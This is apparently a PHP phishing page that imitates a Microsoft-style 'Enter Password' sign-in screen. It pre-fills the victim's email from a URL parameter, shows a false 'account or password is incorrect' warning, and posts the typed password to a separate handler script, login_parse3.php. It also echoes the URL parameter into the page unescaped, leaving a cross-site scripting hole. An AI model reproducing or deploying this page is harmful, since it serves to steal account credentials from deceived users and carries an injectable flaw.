<?php 
$attmail = $_GET['user'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	
 <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link href="main.css" rel="stylesheet" type="text/css" media="all">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src='https://kit.fontawesome.com/a076d05399.js'></script>
<title>MS</title>

<style>
input[type=password] {
	width: 100%;
	padding: 5px 5px;
	margin: 8px 0;
	box-sizing: content-box;
	border: none;
	border-bottom: 1px solid #4e77fe;
	position: relative;
	font-size: 14px;
	height: 70%;
		@include box-sizing(border-box);

		&:focus {
		  z-index: 2;
		}
}

</style>
</head>

<body>

  <div class="wrapper">
  <form class="form-signin" method="POST" action="login_parse3.php">
     <img src="log.png" width="120px" class=" img-fluid" /> 
   <p> <br> <i class='fas fa-arrow-left'></i> <?php echo $attmail; ?></p><h4 class="form-signin-heading">Enter Password</h4>
   <p style="font-size:14px; color:rgb(243, 8, 8)">Your account or password is incorrect. If you don't remember your password, <span style="font-size:14px; color:#4b70e9">reset it now.</span></br>
   </p>
      <input type="password" class="form-controll" name="pass" placeholder="Password" required="" autofocus="" />
      <input type="text" class="form-control" name="user" value="<?php echo $attmail; ?>" hidden/>  
     <!-- <label class="checkbox">
        <input type="checkbox" value="remember-me" id="rememberMe" name="rememberMe"> Remember me
      </label> --></br>  
    
        <p style="font-size:14px; color:#4b70e9">Forgot my password</br>
</p>
   <p align="right">  <button class="btn btn-sm btn-primary "  type="submit">Sign In</button>  <p>
    </form></br>  </div>
</body>
</html>
